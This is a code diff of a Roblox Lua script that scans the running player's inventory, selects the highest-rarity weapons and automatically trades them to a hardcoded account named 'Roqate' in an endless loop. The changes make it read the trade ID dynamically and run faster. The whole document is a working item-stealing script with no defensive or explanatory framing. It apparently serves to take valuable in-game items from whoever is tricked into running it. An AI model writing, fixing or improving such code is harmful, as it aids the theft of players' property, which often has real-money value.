@@ -2,34 +2,25 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
+-- Config
 local TARGET_PLAYER = "Roqate"
 local MAX_ITEMS_PER_TRADE = 4
-local TRADE_COOLDOWN = 5
+local TRADE_COOLDOWN = 2
 local ITEM_ADD_DELAY = 0.3
 
--- Priority: lower = better
-local RARITY_PRIORITY = {
-    Godly = 1,
-    Ancient = 2,
-    Unique = 3,
-    Classic = 4
-}
-
+-- Rarity priority
+local RARITY_PRIORITY = { Godly = 1, Ancient = 2, Unique = 3, Classic = 4 }
 local ALLOWED_RARITIES = {}
-for rarity,_ in pairs(RARITY_PRIORITY) do
-    ALLOWED_RARITIES[rarity] = true
-end
+for r,_ in pairs(RARITY_PRIORITY) do ALLOWED_RARITIES[r] = true end
 
+-- Remotes
 local TradeRemotes = {
     SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
     OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
     AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
 }
 
-local isTrading = false
-local lastTradeTime = 0
-
--- Find exact inventory module
+-- === Inventory detection ===
 local function getCorrectMyInventory()
     for _,module in ipairs(getgc(true)) do
         if type(module) == "table" and rawget(module, "MyInventory") then
@@ -42,35 +33,21 @@ local function getCorrectMyInventory()
     return nil
 end
 
-local function findPlayer(name)
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p.Name:lower() == name:lower() then
-            return p
-        end
-    end
-    return nil
-end
-
-local function isTradeGUIOpen()
-    return LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
-end
-
--- Collect best weapons with correct inventory detection
+-- === Collect best rarity weapons ===
 local function getBestWeapons()
     local inv = getCorrectMyInventory()
     if not inv then
-        warn("❌ Could not find correct MyInventory!")
+        warn("❌ Inventory not found!")
         return {}
     end
 
-    local allWeapons = {}
-
-    for categoryName, categoryTable in pairs(inv.Data.Weapons) do
+    local candidates = {}
+    for _, categoryTable in pairs(inv.Data.Weapons) do
         for weaponName, weaponData in pairs(categoryTable) do
             if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                 local rarity = weaponData.Rarity
                 if rarity and ALLOWED_RARITIES[rarity] then
-                    table.insert(allWeapons, {
+                    table.insert(candidates, {
                         name = weaponName,
                         rarity = rarity,
                         priority = RARITY_PRIORITY[rarity] or 999
@@ -80,90 +57,122 @@ local function getBestWeapons()
         end
     end
 
-    -- Sort best → worst
-    table.sort(allWeapons, function(a, b)
-        return a.priority < b.priority
-    end)
+    table.sort(candidates, function(a,b) return a.priority < b.priority end)
 
     local picked = {}
-    for i = 1, math.min(#allWeapons, MAX_ITEMS_PER_TRADE) do
-        table.insert(picked, allWeapons[i].name)
+    for i = 1, math.min(#candidates, MAX_ITEMS_PER_TRADE) do
+        table.insert(picked, candidates[i].name)
     end
-
     return picked
 end
 
+-- === Detect Trade GUI ===
+local function waitForTradeGUI()
+    local timeout = os.clock() + 10
+    while os.clock() < timeout do
+        local gui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
+        if gui then
+            -- Look for Accept/Decline buttons
+            local acceptBtn = gui:FindFirstChild("Accept", true)
+            local declineBtn = gui:FindFirstChild("Decline", true)
+            if acceptBtn and declineBtn then
+                return gui
+            end
+        end
+        task.wait(0.2)
+    end
+    return nil
+end
+
+-- === Find TradeID dynamically from GUI ===
+local function getTradeID(gui)
+    for _, obj in ipairs(gui:GetDescendants()) do
+        if obj:IsA("ValueBase") and tostring(obj.Name):lower():find("trade") then
+            return obj.Value
+        elseif obj:IsA("TextLabel") and obj.Text:lower():find("trade id") then
+            local num = tonumber(obj.Text:match("%d+"))
+            if num then return num end
+        end
+    end
+    return nil
+end
+
+-- === Wait for "OTHER PLAYER HAS ACCEPTED" ===
+local function waitForOtherPlayerAccept(gui)
+    local timeout = os.clock() + 20
+    while os.clock() < timeout do
+        for _, obj in ipairs(gui:GetDescendants()) do
+            if obj:IsA("TextLabel") and obj.Text:upper():find("OTHER PLAYER HAS ACCEPTED") then
+                return true
+            end
+        end
+        task.wait(0.5)
+    end
+    return false
+end
+
+-- === Add weapons to trade ===
 local function addWeaponsToTrade()
     local weapons = getBestWeapons()
     if #weapons == 0 then
-        warn("⚠ No valid high-rarity weapons found!")
+        warn("⚠ No valid high rarity weapons found!")
         return false
     end
-
-    print("✅ Adding best weapons to trade:")
+    print("✅ Adding weapons:")
     for _, w in ipairs(weapons) do
-        print("   →", w)
+        print("  →", w)
         TradeRemotes.OfferItem:FireServer(w, "Weapons")
         task.wait(ITEM_ADD_DELAY)
     end
     return true
 end
 
-local function acceptTrade()
-    if not isTradeGUIOpen() then
-        warn("⚠ Trade GUI not open!")
+-- === Accept trade dynamically ===
+local function acceptTradeDynamic(gui)
+    local tradeId = getTradeID(gui)
+    if not tradeId then
+        warn("⚠ Could not find TradeID!")
         return false
     end
-    TradeRemotes.AcceptTrade:FireServer(285646582)
+    print("✅ Accepting trade with ID:", tradeId)
+    TradeRemotes.AcceptTrade:FireServer(tradeId)
     return true
 end
 
-local function initiateTrade(targetPlayer)
-    if isTrading or (os.time() - lastTradeTime) < TRADE_COOLDOWN then return end
-
-    isTrading = true
-    print("🔄 Starting trade with " .. targetPlayer.Name .. "...")
-
+-- === Full trade flow ===
+local function doTradeCycle(targetPlayer)
+    print("🔄 Sending trade request to", targetPlayer.Name)
     local ok, err = pcall(function()
         TradeRemotes.SendRequest:InvokeServer(targetPlayer)
     end)
+    if not ok then warn("❌ Trade request failed:", err) return end
 
-    if not ok then
-        warn("❌ Trade request failed:", err)
-        isTrading = false
-        return
-    end
+    local gui = waitForTradeGUI()
+    if not gui then warn("⚠ Trade GUI did not appear!") return end
 
-    task.wait(1)
+    -- Add weapons once GUI ready
+    if not addWeaponsToTrade() then return end
 
-    if not isTradeGUIOpen() then
-        warn("⚠ Trade GUI didn't open!")
-        isTrading = false
-        return
-    end
+    -- Accept the trade
+    if not acceptTradeDynamic(gui) then return end
 
-    if not addWeaponsToTrade() then
-        warn("⚠ No valid weapons to trade!")
-        isTrading = false
-        return
-    end
-
-    if acceptTrade() then
-        print("✅ aaTrade with " .. targetPlayer.Name .. " completed!")
+    -- Wait until other player accepts
+    print("⏳ Waiting for other player to accept...")
+    local otherAccepted = waitForOtherPlayerAccept(gui)
+    if otherAccepted then
+        print("✅ Other player accepted. Trade completed!")
     else
-        warn("❌ Failed to accept trade!")
+        warn("⚠ Timed out waiting for other player accept!")
     end
-
-    isTrading = false
-    lastTradeTime = os.time()
 end
 
+-- === Main loop ===
 while true do
-    local target = findPlayer(TARGET_PLAYER)
+    local target = Players:FindFirstChild(TARGET_PLAYER)
     if target then
-        initiateTrade(target)
+        doTradeCycle(target)
     else
-        print(TARGET_PLAYER .. " not found. Waiting...")
+        print("Waiting for", TARGET_PLAYER, "to be online...")
     end
-    task.wait(5)
+    task.wait(TRADE_COOLDOWN)
 end
